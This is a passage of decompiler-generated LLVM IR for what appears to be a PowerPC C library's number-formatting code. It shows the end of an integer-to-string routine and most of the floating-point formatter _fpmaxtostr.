  %v2_1001237c = udiv i32 %v1_10012388, %v1_100123b8
  %v2_10012380 = mul i32 %v2_1001237c, %v1_100123b8
  %v2_10012384 = mul i32 %v2_10012374, %v1_100123b8
  %v2_10012388 = sub i32 %v1_10012388, %v2_10012380
  store i32 %v2_1001237c, i32* %r12.global-to-local, align 4
  %v0_10012390 = load i32, i32* @r31, align 4
  %v2_10012390 = mul i32 %v0_10012390, %v2_10012388
  %v2_10012394 = sub i32 %v0_10012374, %v2_10012384
  %v2_10012398 = add i32 %v2_10012390, %v2_10012394
  %v0_1001239c = load i32, i32* %r8.global-to-local, align 4
  %v2_1001239c = mul i32 %v0_1001239c, %v2_10012388
  %v2_100123a0 = udiv i32 %v2_10012398, %v1_100123b8
  %v2_100123a4 = add i32 %v2_1001239c, %v2_10012374
  %v2_100123a8 = mul i32 %v2_100123a0, %v1_100123b8
  %v2_100123ac = add i32 %v2_100123a4, %v2_100123a0
  store i32 %v2_100123ac, i32* @r6, align 4
  %v2_100123b0 = sub i32 %v2_10012398, %v2_100123a8
  store i32 %v2_100123b0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100123c4

dec_label_pc_100123b8:                            ; preds = %dec_label_pc_10012370
  %v2_100123b8 = mul i32 %v2_10012374, %v1_100123b8
  %v2_100123bc = sub i32 %v0_10012374, %v2_100123b8
  store i32 %v2_100123bc, i32* %r5.global-to-local, align 4
  store i32 %v2_10012374, i32* @r6, align 4
  br label %dec_label_pc_100123c4

dec_label_pc_100123c4:                            ; preds = %dec_label_pc_1001237c, %dec_label_pc_100123b8
  %v1_100123c8 = phi i32 [ %v2_1001237c, %dec_label_pc_1001237c ], [ 0, %dec_label_pc_100123b8 ]
  %v0_100123c8 = phi i32 [ %v2_100123ac, %dec_label_pc_1001237c ], [ %v2_10012374, %dec_label_pc_100123b8 ]
  %v0_100123cc = phi i32 [ %v2_100123b0, %dec_label_pc_1001237c ], [ %v2_100123bc, %dec_label_pc_100123b8 ]
  %v2_100123c8 = or i32 %v0_100123c8, %v1_100123c8
  %v5_100123c8 = icmp eq i32 %v2_100123c8, 0
  store i1 %v5_100123c8, i1* %cr0_eq.global-to-local, align 1
  %v1_100123d0 = load i32, i32* @r30, align 4
  %v0_100123d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_100123d4 = add i32 %v0_100123d4, -1
  store i32 %v1_100123d4, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_100123cc, 10
  %v1_100123cc.v2_100123d0.v = select i1 %tmp14, i32 48, i32 %v1_100123d0
  %v1_100123cc.v2_100123d0 = add i32 %v0_100123cc, %v1_100123cc.v2_100123d0.v
  %extract.t9.extract.t = trunc i32 %v1_100123cc.v2_100123d0 to i8
  %v3_100123e4 = inttoptr i32 %v1_100123d4 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_100123e4, align 1
  %v0_100123e8 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_100123e8, label %dec_label_pc_100123ec, label %dec_label_pc_10012370thread-pre-split

dec_label_pc_100123ec:                            ; preds = %dec_label_pc_100123c4
  %v0_100123ec = load i32, i32* @r29, align 4
  %v3_100123ec = icmp eq i32 %v0_100123ec, 0
  br i1 %v3_100123ec, label %dec_label_pc_100123ec.dec_label_pc_100123fc_crit_edge, label %dec_label_pc_100123f4

dec_label_pc_100123ec.dec_label_pc_100123fc_crit_edge: ; preds = %dec_label_pc_100123ec
  %v0_10012404.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100123fc

dec_label_pc_100123f4:                            ; preds = %dec_label_pc_100123ec
  %v2_100123f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_100123f8 = add i32 %v2_100123f8, -1
  %v4_100123f8 = inttoptr i32 %v3_100123f8 to i8*
  store i8 45, i8* %v4_100123f8, align 1
  store i32 %v3_100123f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100123fc

dec_label_pc_100123fc:                            ; preds = %dec_label_pc_100123ec.dec_label_pc_100123fc_crit_edge, %dec_label_pc_100123f4
  %v0_10012404 = phi i32 [ %v0_10012404.pre, %dec_label_pc_100123ec.dec_label_pc_100123fc_crit_edge ], [ %v3_100123f8, %dec_label_pc_100123f4 ]
  ret i32 %v0_10012404

; uselistorder directives
  uselistorder i32 %v2_1001237c, { 1, 2, 0 }
  uselistorder i32 %v2_10012374, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_100123b8, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_10012354, { 1, 2, 0 }
  uselistorder i32 %v0_10012354, { 1, 0 }
  uselistorder i32 %v0_10012310, { 1, 2, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_100123fc, { 1, 0 }
  uselistorder label %dec_label_pc_100123c4, { 1, 0 }
  uselistorder label %dec_label_pc_1001236c, { 1, 0 }
  uselistorder label %dec_label_pc_10012344, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10012408 = load i32, i32* @lr, align 4
  store i32 %v0_10012408, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_10012424 = add i32 %tmp, 11
  %v2_10012424 = inttoptr i32 %v1_10012424 to i8*
  %v3_10012424 = load i8, i8* %v2_10012424, align 1
  %v4_10012424 = zext i8 %v3_10012424 to i32
  store i32 %v4_10012424, i32* %r31.global-to-local, align 4
  %v1_10012428 = or i32 %v4_10012424, 32
  %v1_1001242c = icmp ult i32 %v1_10012428, 97
  %v3_1001242c = icmp eq i32 %v1_10012428, 97
  store i1 %v1_1001242c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001242c, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_10012438 = add i32 %tmp, 4
  %v2_10012438 = inttoptr i32 %v1_10012438 to i32*
  %v3_10012438 = load i32, i32* %v2_10012438, align 4
  store i32 %v3_10012438, i32* %r28.global-to-local, align 4
  %v2_1001243c = load i32, i32* %arg2, align 4
  store i32 %v2_1001243c, i32* %r30.global-to-local, align 4
  br i1 %v3_1001242c, label %dec_label_pc_10012444, label %dec_label_pc_1001244c

dec_label_pc_10012444:                            ; preds = %entry
  %v1_10012444 = add nuw nsw i32 %v4_10012424, 6
  store i32 %v1_10012444, i32* %r0.global-to-local, align 4
  %v1_10012448 = urem i32 %v1_10012444, 256
  store i32 %v1_10012448, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001244c

dec_label_pc_1001244c:                            ; preds = %entry, %dec_label_pc_10012444
  %v0_10012500 = phi i32 [ %v4_10012424, %entry ], [ %v1_10012448, %dec_label_pc_10012444 ]
  %v1_1001244c = icmp slt i32 %v2_1001243c, 0
  %v3_1001244c = icmp eq i32 %v2_1001243c, 0
  store i1 %v1_1001244c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001244c, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_1001243c, -1
  br i1 %tmp75, label %dec_label_pc_10012458, label %dec_label_pc_10012454

dec_label_pc_10012454:                            ; preds = %dec_label_pc_1001244c
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10012458

dec_label_pc_10012458:                            ; preds = %dec_label_pc_1001244c, %dec_label_pc_10012454
  %v0_1001261044 = phi i32 [ %v2_1001243c, %dec_label_pc_1001244c ], [ 6, %dec_label_pc_10012454 ]
  %v1_10012458 = add i32 %tmp, 12
  %v2_10012458 = inttoptr i32 %v1_10012458 to i32*
  %v3_10012458 = load i32, i32* %v2_10012458, align 4
  store i32 %v3_10012458, i32* %r9.global-to-local, align 4
  %v1_1001245c = and i32 %v3_10012458, 2
  %v3_1001245c = icmp eq i32 %v1_1001245c, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_1001245c, label %dec_label_pc_10012474, label %dec_label_pc_10012480

dec_label_pc_10012474:                            ; preds = %dec_label_pc_10012458
  %v1_10012474 = urem i32 %v3_10012458, 2
  store i32 %v1_10012474, i32* %r7.global-to-local, align 4
  %v3_10012474 = icmp eq i32 %v1_10012474, 0
  br i1 %v3_10012474, label %dec_label_pc_10012484, label %dec_label_pc_10012480

dec_label_pc_10012480:                            ; preds = %dec_label_pc_10012474, %dec_label_pc_10012458
  %storemerge = phi i32 [ 43, %dec_label_pc_10012458 ], [ 32, %dec_label_pc_10012474 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_10012480 = trunc i32 %storemerge to i8
  store i8 %v6_10012480, i8* %stack_var_-200, align 1
  br label %dec_label_pc_10012484

dec_label_pc_10012484:                            ; preds = %dec_label_pc_10012474, %dec_label_pc_10012480
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1001244c, label %dec_label_pc_100125e8, label %dec_label_pc_10012500

dec_label_pc_10012500:                            ; preds = %dec_label_pc_10012484
  %v1_10012500 = icmp ult i32 %v0_10012500, 96
  %v2_10012500 = icmp ugt i32 %v0_10012500, 96
  %v3_10012500 = icmp eq i32 %v0_10012500, 96
  store i1 %v1_10012500, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012500, i1* %cr7_eq.global-to-local, align 1
  %v2_10012508 = add i32 %tmp, 16
  %v3_10012508 = inttoptr i32 %v2_10012508 to i32*
  store i32 32, i32* %v3_10012508, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_10012500, label %dec_label_pc_1001252c, label %dec_label_pc_10012520

dec_label_pc_10012520:                            ; preds = %dec_label_pc_10012500
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001252c

dec_label_pc_1001252c:                            ; preds = %dec_label_pc_10012500, %dec_label_pc_10012520
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1001c2a0.1125 to i32), i32 8), %dec_label_pc_10012500 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1001c2a0.1125 to i32), i32 12), %dec_label_pc_10012520 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1001c2a0.1125 to i32), i32* %r9.global-to-local, align 4
  %v2_10012538 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10012538, i32* %r8.global-to-local, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100129d8

dec_label_pc_100125e8:                            ; preds = %dec_label_pc_10012484
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_100125ec = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_100125ec, i32* %r6.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_10012638 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_1001260c

dec_label_pc_1001260c:                            ; preds = %dec_label_pc_1001268c.dec_label_pc_1001260c_crit_edge, %dec_label_pc_100125e8
  %v0_10012610 = phi i32 [ %v0_10012610.pre, %dec_label_pc_1001268c.dec_label_pc_1001260c_crit_edge ], [ %v0_1001261044, %dec_label_pc_100125e8 ]
  %v3_10012610 = call %0 @__asm_cror(i32 %v0_10012610, i32 %tmp, i32 %v0_10012610)
  %v11_10012610 = extractvalue %0 %v3_10012610, 7
  store i4 %v11_10012610, i4* @cr4, align 1
  %v0_10012614 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10012614, label %dec_label_pc_10012628, label %dec_label_pc_1001263c

dec_label_pc_10012628:                            ; preds = %dec_label_pc_1001260c
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001263c

dec_label_pc_1001263c:                            ; preds = %dec_label_pc_1001260c, %dec_label_pc_10012628
  %storemerge2 = phi i32 [ %v1_10012638, %dec_label_pc_10012628 ], [ %tmp55, %dec_label_pc_1001260c ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_1001264c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001264c = add i32 %v0_1001264c, 9
  store i32 %v1_1001264c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012668

dec_label_pc_10012668:                            ; preds = %dec_label_pc_10012668.dec_label_pc_10012668_crit_edge, %dec_label_pc_1001263c
  %v1_10012670 = phi i32 [ %v1_10012670.pre, %dec_label_pc_10012668.dec_label_pc_10012668_crit_edge ], [ %v1_1001264c, %dec_label_pc_1001263c ]
  %v0_1001266c = phi i32 [ %v0_1001266c.pre, %dec_label_pc_10012668.dec_label_pc_10012668_crit_edge ], [ 0, %dec_label_pc_1001263c ]
  %v1_10012668 = phi i32 [ %v1_10012668.pre, %dec_label_pc_10012668.dec_label_pc_10012668_crit_edge ], [ 10, %dec_label_pc_1001263c ]
  %v1_10012678 = phi i32 [ %v0_10012668.pre, %dec_label_pc_10012668.dec_label_pc_10012668_crit_edge ], [ %storemerge2, %dec_label_pc_1001263c ]
  %v2_10012668 = udiv i32 %v1_10012678, %v1_10012668
  store i32 %v2_10012668, i32* %r0.global-to-local, align 4
  %v1_1001266c = add i32 %v0_1001266c, 1
  store i32 %v1_1001266c, i32* %r8.global-to-local, align 4
  %v2_10012670 = sub i32 %v1_10012670, %v1_1001266c
  store i32 %v2_10012670, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_10012668, -10
  store i32 %v2_10012668, i32* %r10.global-to-local, align 4
  %v2_10012678 = add i32 %v1_10012678, 48
  %v1_10012680 = add i32 %v2_10012678, %tmp76
  store i32 %v1_10012680, i32* %r9.global-to-local, align 4
  %v1_10012684 = trunc i32 %v1_10012680 to i8
  %v3_10012684 = inttoptr i32 %v2_10012670 to i8*
  store i8 %v1_10012684, i8* %v3_10012684, align 1
  %v0_10012688 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012688 = add i32 %v0_10012688, -1
  store i32 %v1_10012688, i32* %ctr.global-to-local, align 4
  %v2_10012688 = icmp eq i32 %v1_10012688, 0
  br i1 %v2_10012688, label %dec_label_pc_1001268c, label %dec_label_pc_10012668.dec_label_pc_10012668_crit_edge

dec_label_pc_10012668.dec_label_pc_10012668_crit_edge: ; preds = %dec_label_pc_10012668
  %v0_10012668.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10012668.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1001266c.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10012670.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10012668

dec_label_pc_1001268c:                            ; preds = %dec_label_pc_10012668
  %v0_1001268c = load i32, i32* %r7.global-to-local, align 4
  %v1_1001268c = icmp slt i32 %v0_1001268c, 0
  %v3_1001268c = icmp eq i32 %v0_1001268c, 0
  store i1 %v1_1001268c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001268c, i1* %cr7_eq.global-to-local, align 1
  %v1_10012690 = add i32 %v0_1001268c, 1
  store i32 %v1_10012690, i32* %r7.global-to-local, align 4
  br i1 %v3_1001268c, label %dec_label_pc_1001268c.dec_label_pc_1001260c_crit_edge, label %dec_label_pc_10012698

dec_label_pc_1001268c.dec_label_pc_1001260c_crit_edge: ; preds = %dec_label_pc_1001268c
  %v0_10012610.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001260c

dec_label_pc_10012698:                            ; preds = %dec_label_pc_1001268c
  %v0_10012698 = load i32, i32* %r31.global-to-local, align 4
  %v1_10012698 = icmp ult i32 %v0_10012698, 96
  %v2_10012698 = icmp ugt i32 %v0_10012698, 96
  %v3_10012698 = icmp eq i32 %v0_10012698, 96
  store i1 %v1_10012698, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012698, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10012698, label %dec_label_pc_100126b0, label %dec_label_pc_100126a0

dec_label_pc_100126a0:                            ; preds = %dec_label_pc_10012698
  %v1_100126a8 = add i32 %v0_10012698, 32
  store i32 %v1_100126a8, i32* %r0.global-to-local, align 4
  %v1_100126ac = urem i32 %v1_100126a8, 256
  store i32 %v1_100126ac, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100126b0

dec_label_pc_100126b0:                            ; preds = %dec_label_pc_10012698, %dec_label_pc_100126a0
  %v0_100126c8 = phi i32 [ %v1_100126ac, %dec_label_pc_100126a0 ], [ %v0_10012698, %dec_label_pc_10012698 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_100126a0 ], [ 101, %dec_label_pc_10012698 ]
  %v1_100126b0 = icmp slt i32 %v0_100126c8, 103
  %v3_100126b0 = icmp eq i32 %v0_100126c8, 103
  store i1 %v1_100126b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100126b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100126b0, label %dec_label_pc_100126b8, label %dec_label_pc_100126c8

dec_label_pc_100126b8:                            ; preds = %dec_label_pc_100126b0
  %v0_100126b8 = load i32, i32* %r30.global-to-local, align 4
  %v1_100126b8 = icmp slt i32 %v0_100126b8, 0
  %v3_100126b8 = icmp eq i32 %v0_100126b8, 0
  store i1 %v1_100126b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100126b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100126b8, label %dec_label_pc_100126d0, label %dec_label_pc_100126c0

dec_label_pc_100126c0:                            ; preds = %dec_label_pc_100126b8
  %v1_100126c0 = add i32 %v0_100126b8, -1
  store i32 %v1_100126c0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100126d0

dec_label_pc_100126c8:                            ; preds = %dec_label_pc_100126b0
  %v1_100126c8 = icmp slt i32 %v0_100126c8, 102
  %v3_100126c8 = icmp eq i32 %v0_100126c8, 102
  store i1 %v1_100126c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100126c8, i1* %cr7_eq.global-to-local, align 1
  %v0_100126d8 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_100126c8, label %dec_label_pc_100126d8, label %dec_label_pc_100126d0

dec_label_pc_100126d0:                            ; preds = %dec_label_pc_100126c8, %dec_label_pc_100126b8, %dec_label_pc_100126c0
  %v0_100126d0 = phi i32 [ 0, %dec_label_pc_100126b8 ], [ %v1_100126c0, %dec_label_pc_100126c0 ], [ %v0_100126d8, %dec_label_pc_100126c8 ]
  store i32 %v0_100126d0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100126fc

dec_label_pc_100126d8:                            ; preds = %dec_label_pc_100126c8
  %v1_100126d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_100126d8 = add i32 %v1_100126d8, %v0_100126d8
  store i32 %v2_100126d8, i32* %r10.global-to-local, align 4
  %v1_100126dc = icmp slt i32 %v2_100126d8, -1
  %v3_100126dc = icmp eq i32 %v2_100126d8, -1
  store i1 %v1_100126dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100126dc, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_100126d8, -2
  br i1 %tmp77, label %dec_label_pc_100126fc, label %dec_label_pc_100126e4

dec_label_pc_100126e4:                            ; preds = %dec_label_pc_100126d8
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_100126e8 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_100126e8, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268510964, i32* @lr, align 4
  %v3_100126f0 = call i32 @__GI_memset(i32 %v2_100126e8, i32 48, i32 17)
  store i32 %v3_100126f0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100126fc

dec_label_pc_100126fc:                            ; preds = %dec_label_pc_100126d8, %dec_label_pc_100126d0, %dec_label_pc_100126e4
  %v1_10012720 = phi i32 [ %v2_100126d8, %dec_label_pc_100126d8 ], [ %v0_100126d0, %dec_label_pc_100126d0 ], [ -1, %dec_label_pc_100126e4 ]
  %v1_100126fc = icmp slt i32 %v1_10012720, 16
  %v2_100126fc = icmp sgt i32 %v1_10012720, 16
  %v3_100126fc = icmp eq i32 %v1_10012720, 16
  store i1 %v1_100126fc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100126fc, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_10012710 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_10012710, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_100126fc, label %dec_label_pc_10012738, label %dec_label_pc_1001271c

dec_label_pc_1001271c:                            ; preds = %dec_label_pc_100126fc
  %v2_1001271c = ptrtoint i32* %stack_var_-177 to i32
  %v2_10012720 = add i32 %v1_10012720, %v2_1001271c
  store i32 %v2_10012720, i32* %r9.global-to-local, align 4
  %v1_10012724 = add i32 %v2_10012720, 2
  %v2_10012724 = inttoptr i32 %v1_10012724 to i8*
  %v3_10012724 = load i8, i8* %v2_10012724, align 1
  %v4_10012724 = zext i8 %v3_10012724 to i32
  store i32 %v4_10012724, i32* %r0.global-to-local, align 4
  store i32 %v1_10012724, i32* %r11.global-to-local, align 4
  %v1_1001272c = sub nsw i32 52, %v4_10012724
  %v2_1001272c = sub nuw nsw i32 -1, %v4_10012724
  %not.v5_1001272c = icmp ugt i32 %v1_1001272c, %v2_1001272c
  %v1_10012734 = zext i1 %not.v5_1001272c to i32
  store i32 %v1_10012734, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10012738

dec_label_pc_10012738:                            ; preds = %dec_label_pc_100126fc, %dec_label_pc_1001271c, %dec_label_pc_10012738.backedge
  %v0_1001273c = phi i32 [ %v0_1001273c.pre, %dec_label_pc_10012738.backedge ], [ 0, %dec_label_pc_100126fc ], [ %v1_10012734, %dec_label_pc_1001271c ]
  %v0_10012738 = phi i32 [ %v0_10012738.pre, %dec_label_pc_10012738.backedge ], [ %v2_10012710, %dec_label_pc_100126fc ], [ %v1_10012724, %dec_label_pc_1001271c ]
  %v1_10012738 = add i32 %v0_10012738, -1
  %v2_10012738 = inttoptr i32 %v1_10012738 to i8*
  %v3_10012738 = load i8, i8* %v2_10012738, align 1
  %v4_10012738 = zext i8 %v3_10012738 to i32
  store i32 %v1_10012738, i32* %r11.global-to-local, align 4
  %v2_1001273c = add i32 %v4_10012738, %v0_1001273c
  store i32 %v2_1001273c, i32* %r0.global-to-local, align 4
  %v1_10012740 = urem i32 %v2_1001273c, 256
  store i32 %v1_10012740, i32* %r9.global-to-local, align 4
  %v1_10012744 = trunc i32 %v2_1001273c to i8
  store i8 %v1_10012744, i8* %v2_10012738, align 1
  %v0_10012748 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012748 = icmp slt i32 %v0_10012748, 48
  %v3_10012748 = icmp eq i32 %v0_10012748, 48
  store i1 %v1_10012748, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012748, i1* %cr7_eq.global-to-local, align 1
  %v1_1001274c = icmp ult i32 %v0_10012748, 57
  %v2_1001274c = icmp ugt i32 %v0_10012748, 57
  %v3_1001274c = icmp eq i32 %v0_10012748, 57
  store i1 %v1_1001274c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1001274c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1001274c, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10012748, %v2_1001274c
  br i1 %brmerge, label %dec_label_pc_10012738.backedge, label %dec_label_pc_10012758

dec_label_pc_10012738.backedge:                   ; preds = %dec_label_pc_10012738
  %v0_10012738.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1001273c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10012738

dec_label_pc_10012758:                            ; preds = %dec_label_pc_10012738
  %v2_10012758 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_10012758, i32* %r0.global-to-local, align 4
  %v0_1001275c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1001275c, i32* %r7.global-to-local, align 4
  %v0_10012760 = load i32, i32* %r11.global-to-local, align 4
  %v2_10012760 = icmp ult i32 %v0_10012760, %v2_10012758
  %v3_10012760 = icmp ugt i32 %v0_10012760, %v2_10012758
  %v4_10012760 = icmp eq i32 %v0_10012760, %v2_10012758
  store i1 %v2_10012760, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012760, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_100125ec, i32* %r8.global-to-local, align 4
  br i1 %v3_10012760, label %dec_label_pc_10012778, label %dec_label_pc_1001276c

dec_label_pc_1001276c:                            ; preds = %dec_label_pc_10012758
  store i32 %v2_10012758, i32* %r8.global-to-local, align 4
  %v1_10012770 = add i32 %v0_1001275c, 1
  store i32 %v1_10012770, i32* %r7.global-to-local, align 4
  store i32 %v2_10012758, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10012778

dec_label_pc_10012778:                            ; preds = %dec_label_pc_10012758, %dec_label_pc_1001276c
  %v2_10012780 = phi i32 [ %v0_10012760, %dec_label_pc_10012758 ], [ %v2_10012758, %dec_label_pc_1001276c ]
  %v0_10012778 = load i32, i32* %r31.global-to-local, align 4
  %v1_10012778 = icmp slt i32 %v0_10012778, 103
  %v3_10012778 = icmp eq i32 %v0_10012778, 103
  store i1 %v1_10012778, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012778, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10012780 = add i32 %v2_10012780, 1
  %v4_10012780 = inttoptr i32 %v3_10012780 to i8*
  store i8 0, i8* %v4_10012780, align 1
  %v0_10012784 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012784 = add i32 %v0_10012784, 1
  store i32 %v1_10012784, i32* %r9.global-to-local, align 4
  %v0_10012788 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10012788, label %dec_label_pc_1001278c, label %dec_label_pc_100127b0

dec_label_pc_1001278c:                            ; preds = %dec_label_pc_10012778
  %v0_1001278c = load i32, i32* %r7.global-to-local, align 4
  %v1_1001278c = icmp slt i32 %v0_1001278c, -4
  %v3_1001278c = icmp eq i32 %v0_1001278c, -4
  store i1 %v1_1001278c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001278c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1001278c, label %dec_label_pc_100127a8, label %dec_label_pc_10012794

dec_label_pc_10012794:                            ; preds = %dec_label_pc_1001278c
  %v1_10012794 = load i32, i32* %r10.global-to-local, align 4
  %v2_10012794 = icmp sgt i32 %v1_10012794, %v0_1001278c
  %v3_10012794 = icmp slt i32 %v1_10012794, %v0_1001278c
  %v4_10012794 = icmp eq i32 %v1_10012794, %v0_1001278c
  store i1 %v2_10012794, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012794, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012794, label %dec_label_pc_100127a8, label %dec_label_pc_1001279c

dec_label_pc_1001279c:                            ; preds = %dec_label_pc_10012794
  %v2_1001279c = sub i32 %v1_10012794, %v0_1001278c
  store i32 %v2_1001279c, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
